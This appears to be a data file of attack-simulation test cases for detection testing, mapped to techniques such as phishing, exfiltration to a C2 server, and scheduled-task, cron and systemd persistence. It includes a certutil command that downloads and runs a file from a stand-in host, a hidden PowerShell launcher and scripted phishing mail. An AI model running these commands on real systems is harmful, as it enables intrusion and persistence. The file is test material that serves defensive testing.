attacks.description: Basic command to test PowerShell execution
attacks.expected_behavior: Prints 'Hello World' to the console

attacks.description: Intermediate command to test Base64 decoding and execution
attacks.expected_behavior: Prints 'Base64 decoding test' and then 'Hello world' to the console

attacks.command: powershell -Command "& {mkdir '$env:TEMP\Test' -ErrorAction SilentlyContinue}; powershell -Command "& {Write-Host 'File creation test'}; Set-Content -Path '$env:TEMP\Test\test.txt' -Value 'Test content'"
attacks.description: Advanced command to test file creation and writing
attacks.expected_behavior: Creates a directory and file in $env:TEMP and writes 'Test content' to the file

attacks.description: Download PDF-named shell script from phishing email and execute
attacks.expected_behavior: Downloads file to /tmp, makes executable, and executes disguised script

attacks.description: Pipe remote script directly to bash with spoofed legal case argument
attacks.expected_behavior: Executes attacker-controlled script immediately without writing to disk

attacks.description: Obfuscated payload in hidden directory with base64 encoding
attacks.expected_behavior: Creates hidden directory, decodes/executes payload with stealthier storage

attacks.description: Basic: Open WinRAR, relying on the user to manually update it, potentially exploiting a vulnerable version.
attacks.expected_behavior: WinRAR opens, and the user may interact with it, potentially updating it.

attacks.description: Intermediate: Use PowerShell to start WinRAR, demonstrating user execution through a more advanced command.
attacks.expected_behavior: WinRAR opens through PowerShell, showing a more sophisticated user execution technique.

attacks.description: Advanced: Execute WinRAR from the AppData directory, simulating a more complex user execution scenario.
attacks.expected_behavior: WinRAR opens from the specified directory, demonstrating a more advanced user execution technique.

attacks.description: Basic command to create a file using cmd.exe
attacks.expected_behavior: Creates a file named test.txt in the user's temporary directory

attacks.description: Intermediate command to display a message box using PowerShell
attacks.expected_behavior: Displays a message box with the text 'Test Message'

attacks.description: Advanced command to compress a file using PowerShell
attacks.expected_behavior: Compresses the test.txt file into a zip archive named test.zip in the user's temporary directory

attacks.description: Basic command to retrieve a list of running processes using PowerShell.
attacks.expected_behavior: Lists all running processes.

attacks.description: Intermediate command demonstrating file operation with PowerShell, compressing cmd.exe into a zip file in the temp directory.
attacks.expected_behavior: Creates a zip archive of cmd.exe in the temp directory.

attacks.description: Advanced command using Start-Process to execute cmd.exe and create a test file in the temp directory.
attacks.expected_behavior: Creates a file named test.txt in the temp directory with the content 'Test'.

attacks.description: Downloads a benign exploit from a fictional URL to the temp directory
attacks.expected_behavior: The command downloads a file to the temp directory without executing it

attacks.command: cmd.exe /c certutil -urlcache -f http://example.com/exploit exploit.exe && start exploit.exe
attacks.description: Downloads and executes a benign exploit using certutil and starts the process
attacks.expected_behavior: The command downloads and executes the exploit, which should be a benign executable

attacks.description: Attempts to exploit WinRAR using a fictional vulnerability
attacks.expected_behavior: The command attempts to exploit WinRAR, which should be monitored for detection

attacks.description: Simulate the download and execution of a potentially exploitable script from a public-facing application.
attacks.expected_behavior: The command downloads a script from a specified URL and executes it using bash, simulating the exploitation of a vulnerable public-facing application.

attacks.description: Simulate the download of a malicious payload from a public-facing application, making it executable, and then executing it.
attacks.expected_behavior: The command downloads a payload from a specified URL, saves it to a temporary location, makes it executable, and then executes it, simulating the exploitation process.

attacks.description: Create a test exploit payload and execute it using Python, simulating the exploitation of a public-facing application.
attacks.expected_behavior: The command creates a simple test payload, saves it to a file, and then executes it using Python, demonstrating a basic exploitation scenario without causing harm.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic command to send the result of the ls command to the C2 server
attacks.expected_behavior: The command will send the result of the ls command to the specified URL

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate command to send the content of the /etc/passwd file to the C2 server
attacks.expected_behavior: The command will send the content of the /etc/passwd file to the specified URL

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Advanced command to send the result of the echo $PATH command to the C2 server
attacks.expected_behavior: The command will send the result of the echo $PATH command to the specified URL

attacks.description: Create a new scheduled task to execute a VBS file every three minutes
attacks.expected_behavior: The VBS file will be executed every three minutes

attacks.description: Create a new scheduled task to execute a VBS file every three minutes using PowerShell
attacks.expected_behavior: The VBS file will be executed every three minutes

attacks.command: schtasks /create /tn "Test Task" /tr "cmd.exe /c echo Hello World > %TEMP%\test.txt" /sc minute /mo 3
attacks.description: Create a new scheduled task to execute a command every three minutes
attacks.expected_behavior: A new file will be created every three minutes with the contents 'Hello World'

attacks.description: Open the cron table for editing to add a new job
attacks.expected_behavior: The cron table will be opened in the default editor, allowing the user to add a new job

attacks.description: Add a new cron job to execute every 3 minutes
attacks.expected_behavior: A new cron job will be added to execute the echo command every 3 minutes

attacks.description: Start the cron service to enable the new job
attacks.expected_behavior: The cron service will be started, enabling the new job to be executed

attacks.description: Basic VBS script execution
attacks.expected_behavior: The VBS script will execute a PowerShell command that prints a test string to the console.

attacks.description: Intermediate VBS script execution with encoded PowerShell command
attacks.expected_behavior: The VBS script will execute an encoded PowerShell command that prints a test string to the console.

attacks.command: echo CreateObject("WScript.Shell").Run "powershell -Command "^& {Start-Process -FilePath powershell -ArgumentList '-Command', '^& {Write-Host "Test"}' -WindowStyle Hidden}"", 0, False > %TEMP%\test.vbs && cscript //nologo %TEMP%\test.vbs
attacks.description: Advanced VBS script execution with hidden PowerShell process
attacks.expected_behavior: The VBS script will execute a hidden PowerShell process that prints a test string to the console.

attacks.description: Lists files and directories in the current working directory
attacks.expected_behavior: Displays a list of files and directories in the current directory

attacks.description: Lists files and directories in the Windows directory using PowerShell
attacks.expected_behavior: Displays a list of files and directories in the Windows directory

attacks.description: Lists all files and directories (including hidden ones) in the Users directory using cmd.exe
attacks.expected_behavior: Displays a list of all files and directories in the Users directory

attacks.description: Create a malicious DOCX file
attacks.expected_behavior: A malicious DOCX file is created in the current directory

attacks.command: echo 'Subject: Phishing Email' > email.txt; echo 'Please open the attached file' >> email.txt; echo 'malicious_content' > malicious.docx; cat email.txt | mail -s 'Phishing Email' -a malicious.docx user@example.com
attacks.description: Send a phishing email with a malicious attachment
attacks.expected_behavior: A phishing email with a malicious attachment is sent to the specified user

attacks.command: echo 'echo "malicious_content" > malicious.docx' > script.sh; echo 'cat email.txt | mail -s "Phishing Email" -a malicious.docx user@example.com' >> script.sh; chmod +x script.sh; ./script.sh
attacks.description: Use a script to automate the process of creating and sending a malicious attachment
attacks.expected_behavior: A script is created and executed, which creates a malicious DOCX file and sends a phishing email with the attachment to the specified user

attacks.description: Takes a screenshot of the entire desktop using .NET Graphics classes and saves it as a PNG file in the temp directory
attacks.expected_behavior: A file named 'screenshot_basic.png' is created in the user's TEMP directory containing an image of the entire desktop. PowerShell process spawns and exits cleanly.

attacks.description: Same as basic command but delivered via Base64-encoded PowerShell to simulate obfuscation used in real attacks
attacks.expected_behavior: A file named 'screenshot_intermediate.png' is created in the user's TEMP directory containing an image of the entire desktop. The command uses encoded payload to evade simple signature detection.

attacks.description: Takes a screenshot and saves it as a hidden file in the temp directory to simulate stealthy data collection
attacks.expected_behavior: A hidden file named '.scrshot.png' is created in the user's TEMP directory containing a screenshot of the desktop. The file attribute is set to 'Hidden' to avoid casual discovery.

attacks.description: Add user cron job to create file in /tmp every minute
attacks.expected_behavior: Creates /tmp/test_cron_job file every minute via user cron

attacks.description: Append system-wide cron job (requires root)
attacks.expected_behavior: Adds persistent system cron job writing to /tmp/system_cron_test

attacks.command:
sudo bash -c 'cat <<EOF > /etc/systemd/system/test-service.service
[Unit]
Description=Test Service

[Service]
ExecStart=/bin/bash -c "echo test >> /tmp/systemd_test"
EOF && cat <<EOF > /etc/systemd/system/test-timer.timer
[Unit]
Description=Test Timer

[Timer]
OnCalendar=*:*:0/1
Unit=test-service.service

[Install]
WantedBy=timers.target
EOF && systemctl daemon-reload && systemctl enable test-timer.timer --now'
attacks.description: Create systemd timer/service for minute-persistent execution
attacks.expected_behavior: Creates systemd service+timer that writes to /tmp/systemd_test every minute
